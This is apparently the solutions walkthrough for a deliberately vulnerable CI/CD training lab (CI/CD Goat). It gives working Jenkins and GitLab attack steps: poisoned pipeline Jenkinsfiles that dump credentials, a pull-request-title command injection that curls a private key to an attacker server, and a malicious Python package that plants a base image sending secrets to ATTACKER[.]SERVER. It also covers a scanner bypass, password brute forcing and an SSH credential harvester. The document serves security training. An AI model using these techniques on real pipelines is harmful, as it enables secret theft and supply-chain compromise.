# Solution: CI/CD

## Caterpillar

Create a pull request originated from a fork and execute a [Public-PPE (3PE)](https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422) attack against the _Wonderland/Caterpillar_ repository to elevate your privileges and steal the _secret_credential2_ secret.

1. Fork the _Wonderland/Caterpillar_ repository.
2. Modify the Jenkinsfile in the fork to print the environment variables into the console output, or send it to a server you control.

   ```groovy
   stage ('Install_Requirements') {
       steps {
           sh 'env'
       }
   }
   ```

3. Create a pull request based on the fork into the main branch of the original repository. The _wonderland-caterpillar-test_ Jenkins pipeline, originally intended to run tests against the repository code, will be executed.
4. Access the console output of the executed job to get the _gitea_token_. This token has Write permission on the repository, which effectively allows you to elevate your privileges against the repo.
5. Clone the repository using the token.

   ```shell
   git clone http://5d3ed5564341d5060c8524c41fe03507e296ca46@localhost:3000/Wonderland/caterpillar.git
   ```

6. Modify the Jenkinsfile to load the _secret_credential2_ secret as an environment variable and print it to the console output (or to send it to a remote host).

   ```groovy
   stage('deploy') {
       steps {
           withCredentials([usernamePassword(credentialsId: 'secret_credential2', usernameVariable: 'secret_credential2', passwordVariable: 'TOKEN')]) {
               sh 'echo $TOKEN | base64'
           }
       }
   }
   ```

7. Push the modified Jenkinsfile to the main branch in the repository. The _wonderland-caterpillar-prod_ pipeline will be triggered automatically.
8. Access the console output of the executed job to get the encoded secret.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/caterpillar.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

# Cheshire Cat

Execute the _cheshire-cat_ pipeline on the Jenkins Controller by executing a [Direct-PPE](https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422) attack, and get the secret which is stored in the Controller‚Äôs file system.

1. Clone the _Wonderland/cheshire-cat_ repository.
2. Checkout to a new branch.

   ```shell
   git checkout -b challenge5
   ```

3. In the Jenkinsfile, instruct the pipeline to run on the Controller by specifying its default label - `built-in`, and print _secret_credential5_ to the console output (or send it to a remote server).

   ```groovy
   pipeline {
       agent {label 'built-in'}
       environment {
           PROJECT = "sanic"
       }

       stages {
           stage ('Install_Requirements') {
               steps {
                   sh 'cat ~/secret_credential5.txt'
               }
           }
       }

       post {
           always {
               cleanWs()
           }
       }
   }
   ```

4. Push the changes to the remote branch, and create a pull request. A pipeline will be triggered automatically.
5. Access the console output of the executed job to get the secret.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/cheshire_cat.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

## Dodo

Running security scans in CI pipelines is a common practice. [Checkov](https://github.com/bridgecrewio/checkov), a static code analysis tool for IaC, is a known example for such a scanner.

In this challenge, Checkov validates that the S3 bucket created by the Terraform code is private, which stops you from making it public. The check can be bypassed by overriding the Checkov configuration, using the [Malicious Code Analysis](https://www.cidersecurity.io/blog/research/malicious-code-analysis-abusing-sast-misconfigurations-to-hack-ci-systems/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422) vector.

1. Clone the _Wonderland/dodo_ repository.
2. Modify the ACL of the _dodo_ S3 bucket under _main.tf_ to:

   ```json
   acl           = "public-read"
   ```

3. Create a file named _.checkov.yaml_ with the following content. The file will override the Checkov configuration in the pipeline and instruct it to not check for issues, since the MY_CHECK directory doesn't exist:

   ```yaml
   soft-fail: true
   check:
     - MY_CHECK
   ```

4. Push the code to the repository and the secret_credential will be printed to the job‚Äôs console output.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/dodo.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

# Dormhouse

This challenge draws inspiration from the [Codecov incident](https://about.codecov.io/security-update/), in which a 3rd party artifact included in the pipeline is hijacked.

Codecov has a script used in customers‚Äô CI pipelines. The script was hosted separately from its open-sourced code. The script was modified directly where it‚Äôs stored (without changing the source code) with malicious code that stole credentials from pipeline jobs.

Pipelines that would have validated the script‚Äôs hash against the repository code, would have prevented a successful attack.

In the challenge, Reportcov is a public repository of a 3rd party used by other CI pipelines. It has its own pipeline (which you can‚Äôt view), creating an artifact stored remotely. You can execute command injection in the pipeline in order to run malicious code in the job, steal the private key of the server hosting the artifact, and then modify it to exfiltrate credentials from CI pipelines that use the artifact.

1. Fork the _Cov/reportcov_ repository and create an arbitrary change.
2. Create a pull request with the following command as its title:

   ```shell
   `echo "${KEY}" > key && curl -v -F file=@key <YOUR SERVER>`
   ```

   The injection is possible since the following line treats the title as a bash variable and as such it can evaluate command substitution inside.

   `sh "echo Pull Request ${title} created in the reportcov repository"`

   GitHub published an [interesting article](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) about command injection in CI pipelines.

3. Use the private key to upload a malicious _reportcov.sh_ script:

   ```shell
   echo "${secret_credential}" | base64 > reportcov.sh
   chmod 400 key
   scp -P 2222 -i key reportcov.sh root@localhost:/var/www/localhost/htdocs
   ```

4. Run the dormouse pipeline.
5. Access the console output of the executed job to get the secret.

# Duchess

Secrets are often pushed to the SCM unintentionally. This makes them accessible to any user with Read permission on the repository.

A common mistake when trying to mitigate the issue is to remove the secret from the branch where the secret was committed to, while the secret is left exposed in past commits - which are still accessible to anyone with access to the repository.

Finding secrets manually in past commits might be tedious, however there are plenty of secret scanners that can be used to automate the process.

1. Clone the repository.

   ```bash
   git clone http://localhost:3000/Wonderland/duchess.git
   ```

2. Download [Gitleaks](https://github.com/zricethezav/gitleaks), or any other repository secret scanner.
3. Run Gitleaks against the repository:

   ```bash
   gitleaks detect -v
   ```

4. Grab the pypi token.

   ```json
   {
     "Description": "PyPI upload token",
     "StartLine": 8,
     "EndLine": 8,
     "StartColumn": 13,
     "EndColumn": 184,
     "Match": "pypi-AgEIcHlwaS5vcmcCJGNmNTI5MjkyLWYxYWMtNDEwYS04OTBjLWE4YzNjNGY1ZTBiZAACJXsicGVybWlzc2lvbnMiOiAidXNlciIsICJ2ZXJzaW9uIjogMX0AAAYg7T5yHIewxGoh-3st7anbMSCoGhb-U3HnzHAFLHBLNBY",
     "Secret": "pypi-AgEIcHlwaS5vcmcCJGNmNTI5MjkyLWYxYWMtNDEwYS04OTBjLWE4YzNjNGY1ZTBiZAACJXsicGVybWlzc2lvbnMiOiAidXNlciIsICJ2ZXJzaW9uIjogMX0AAAYg7T5yHIewxGoh-3st7anbMSCoGhb-U3HnzHAFLHBLNBY",
     "File": ".pypirc",
     "Commit": "43f216c2268a94ff03e5400cd4ca7a11243821b0",
     "Entropy": 5.538379,
     "Author": "Asaf",
     "Email": "asaf@cidersecurity.io",
     "Date": "2021-11-16T09:22:31Z",
     "Message": ".",
     "Tags": [],
     "RuleID": "pypi-upload-token"
   }
   ```

## Gryphon

Let's explore what we have when signing in to the compromised GitLab user account:

We are the maintainers of _pygryphon_ package. There are also public projects: _nest-of-gold_ and _awesome-app_ to which we have read-only access.

As the instructions of this challenge hint, let's try to see if we can find any reference to _secret_credential11_.

A simple search tells us it is referenced by the _nest-of-gold_ project

<img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/gryphon-1.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

We can see that _secret_credential11_ is used in a pipeline that ships a container used in production.

Browsing to the pipeline settings, we discover that a scheduling is set, and that a user named "gryphon" is executing the pipeline.

If we keep looking, we can discover that the same user is executing the _awesome-app_ project's pipeline.

Diving into _awesome-app_, it is using the pygrphon package as a dependency! We can tell it by the _requirments.txt_ file:

```
--extra-index-url http://token:cd79dd622c6d463a574635e874765c0b@gitlab/api/v4/projects/pygryphon%2Fpygryphon/packages/pypi/simple --trusted-host gitlab

pytest==7.2.0
flask==2.0.3
Werkzeug==2.0.3
pygryphon==1.0.13
```

This means we can try and influence the _awesome-app_ pipeline by uploading a new malicious Python package of _pygryphon_. We'll get back to it in a moment.

Our end goal is in the _nest-of-gold_ project, how can we influence its pipeline?

Let's have a look at the Dockerfile inside _nest-of-gold_. We can see it's dependent on the python:3.8 docker image stored in the _nest-of-gold_ container registry, and not the offical registry.

```docker
FROM gitlab:5050/wonderland/nest-of-gold/python:3.8

WORKDIR /app
COPY app.py .
COPY requirements.txt .
RUN pip3 install -r requirements.txt

CMD [ "python3", "-m" , "flask", "run", "--host=0.0.0.0"]
```

Here comes the tricky part ü•∏ let's create a malicious _pygryphon_ package that pushes a malicious python3.8 docker base image to the _nest-of-gold_ container registry.

In the _awesome-app_ pipeline we can see a PAT being used named _TOKEN_.

`docker login -u gryphon -p $TOKEN $CI_REGISTRY`

Let's try to steal this token and use it against the _nest-of-gold_ container registry.  
In this package, we create a script named "python3" that the docker image of _nest-of-gold_ will execute mistakenly instead of the actual python3 interpreter.  
Modified _greet.py_ content:

```python
import subprocess

DOCKERFILE = """FROM python:3.8
COPY python3 /usr/local/bin/
COPY python3 /usr/local/bin/pip3"""
# Exfiltrate secret_credential11. Insert your server address
PYTHON3 = """#!/bin/bash
env | grep secret_credential11 | curl -X POST --data-binary @- https://ATTACKER[.]SERVER/"""


def run(cmd):
    proc = subprocess.run(cmd, shell=True, timeout=180)
    print(proc.stdout)
    print(proc.stderr)


def hello(name):
    """
    We will build and push a malicous docker image as if it were python 3.8, but in fact
    the python3 binary will be our evil script
    """
    run('apk add docker-cli')
    with open('Dockerfile', 'w') as f:
        f.write(DOCKERFILE)
    with open('python3', 'w') as f:
        f.write(PYTHON3)
    # Grant our script execution permission
    run('chmod +x python3')
    # Build the docker file
    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
    # Login to the docker registry using TOKEN
    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
    # Push our malicious python docker image to the registry
    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
    return "Hello, " + name
```

Build and upload this package to the gryphon package registry (after configuring GitLab as the package registry).

Conveniently you may use these files to build the package:

[.pypirc](/tests/data/pygryphon/.pypirc)

[pyproject.toml](/tests/data/pygryphon/pyproject.toml)

```shell
pipenv run python3 -m build [path_to_package]
pipenv run python3 -m twine upload -r gitlab
```

Now prepare a cup of coffe ‚òïÔ∏è wait for the two pipeline scheduling to take place, and expect the secret_credential to arrive at your http server.

Solution summary:
<img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/gryphon-2.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

## Hearts

Identify the user that has privileged access to manage agents. Looking at the list of Jenkins users shows a short list of users, one of them is Knave - whose description reveals that it is an agents admin. Sounds like a place to start from.

The users in the Jenkins instance are managed by Jenkins‚Äô own user database, which lacks basic security controls against various types of attacks. It means that you can brute force the Knave user to find its password. Then, you‚Äôd be able to create a new agent and exfiltrate the System credentials by making Jenkins send it to your server.

1. Login to Jenkins with alice.
2. Browse to the People page on the top left corner and click on Knave to read its description, which reveals that it has permissions to manage Jenkins agents.

   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/hearts_1.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

3. Brute force Knave‚Äôs password on Jenkins. You can use the Rockyou list. Password is _rockme_. Login with Knave.

4. Click one of the agents on the left panel, then click Nodes at the top bar and create a new node.

5. Setup an SSH server that can log credentials on login attempts, using a project like [this](https://github.com/jtesta/ssh-mitm). Guide for installing the tool can be found [here](https://miloserdov.org/?p=3699).

6. Configure a new node with the following settings:

   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/hearts_2.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

7. Read the logs using
   `sudo tail -f /var/log/auth.log`

   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/hearts_3.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

Note: The SSH server can also be created locally by setting up the ssh-mitm container in the "goat" network using `docker network connect`.

## Mad Hatter

The _mad-hatter_ pipeline is configured in a separate repository (_Wonderland/mad-hatter-pipeline_) from where the application code is stored at. The attacker doesn‚Äôt have permission to trigger a pipeline with a modified Jenkinsfile, so Direct-PPE isn‚Äôt an option.

The Jenkinsfile runs the _make_ command while secret_credential3 is loaded into memory. Execute an [Indirect-PPE](https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422) attack by modifying the Makefile and exfiltrate the secret_credential.

1. Modify the Makefile in the main branch under the _Wonderland/mad-hatter_ repository to print _secret_credential3_ to the console output of the Jenkins job (or send it to a host you control).

   ```Makefile
   whoami:
       echo "${secret_credential}" | base64
   ```

2. A pipeline will be triggered automatically. Access the console output of the executed job to get the encoded secret.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/mad_hatter.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

## Mock Turtle

The _mock-turtle_ pipeline is used to automatically merge code into the main branch if it introduces just a version bump (stored in the _version_ file). The auto-merge code can be bypassed to merge malicious code into the main branch. The code was inspired by this [blog post](https://blog.ryotak.me/post/homebrew-security-incident-en/) by Ryotak, and this [Stack Overflow answer](https://stackoverflow.com/a/31823590/6691195) about counting words diff.

The auto-merge code checks for three conditions that should be met:

1. No words are added in the pull request. When just the version is updated, one line (and word) is considered removed by the git diff check, and one word is added, so 0 words are added or removed in total.
2. Version structure is left the same.
3. Version file is changed.

The first condition naively checks that no new words were added in the pull request - as only the version itself should be modified. However, the attacker can add his payload in the Jenkinsfile - and delete an equivalent number of words from any other file in the repo, so the total number of changed words will be zero.

The second and third conditions are easy to meet. Just change one of the numbers in the version file, and keep its structure. The problem with the third condition is that while it checks for a change in the version file, it doesn‚Äôt verify that it‚Äôs the only file that is changed.

To access the secret_credential, the attacker can do as follows:

1. Checkout to a new branch.
2. Modify the version file, so its structure would stay valid (like 1.2.3).
3. Modify the Jenkinsfile to access the secret_credential.

   ```groovy
   withCredentials([usernamePassword(credentialsId: 'secret_credential10', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
       sh 'echo $TOKEN | base64'
   }
   ```

4. In addition, remove an identical number of words from anywhere in the repository as in the code appended to the Jenkinsfile, to bypass condition #1.
5. Create a pull request from the new branch to main.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/mock_turtle_1.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />
6. The pipeline is triggered, merging the pull request automatically.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/mock_turtle_2.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/mock_turtle_3.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />
7. The pipeline is triggered again, this time on the main branch, exposing the code in the job‚Äôs console output.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/mock_turtle_4.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

## Twiddledum

The _Wonderland/Twiddledum_ repository is a JS app that uses _Wonderland/Twiddledee_ as a dependency (view its _package.json_ file).

You have write access to the _Wonderland/Twiddledee_ repository. Use your access to modify it in order to exfiltrate pipeline credentials of projects using it.

Trying to add pre or post-install scripts with malicious code should fail, as the _Twiddledum_ pipeline runs with the `‚Äì-ignore-scripts` param.

1. Clone the _Wonderland/twiddledee_ repository.
2. Add the following line to _index.js_ to print it to the job‚Äôs console output (or send it to a remote server you control):

   ```javascript
   console.log(Buffer.from(process.env.secret_credential6).toString("base64"));
   ```

3. Commit the changes to the main branch.
4. Create a new tag `1.2.0` for the last commit and push it (see [NPM's docs](https://docs.npmjs.com/cli/v9/configuring-npm/package-json#git-urls-as-dependencies) for further details on git version reference):
   ```bash
   git tag 1.2.0 HEAD
   git push origin 1.2.0
   ```
5. Manually trigger the _twiddledum_ pipeline.
6. Access the console output of the executed job to get the encoded secret.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/twiddledum.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />

## White Rabbit

Create a pull request and execute a [Direct-PPE](https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422) attack against the _Wonderland/white-rabbit_ repository to steal the _secret_credential1_ secret.

The secret_credential is stored in the Jenkins credential store with the Global scope, which makes it accessible to any pipeline on the Jenkins instance.

1. Clone the _Wonderland/white-rabbit_ repository.
2. Checkout to a new branch.

   ```shell
   git checkout -b challenge1
   ```

3. Modify the Jenkinsfile to load _secret_credential1_, and print it to the Jenkins build console output which you have access to (encode it so it won‚Äôt be masked), or send it to a host you control.

   ```groovy
   stage ('Install_Requirements') {
       steps {

           withCredentials([string(credentialsId: 'secret_credential1', variable: 'secret_credential1')]) {
               sh '''
                   echo $secret_credential1 | base64
               '''
           }
       }
   }
   ```

4. Push the changes to the remote branch and create a pull request. A pipeline will be triggered automatically.
5. Access the console output of the executed job to get the encoded secret.
   <img src='https://cyber-lead-assets.s3.amazonaws.com/M03-Security_Evaluation_and_Testing_Red/D06-CI_CD_Pentesting/03-solutions/white_rabbit.png' style={{ width: '100%', maxWidth: '500px', margin: '0 auto' }} />
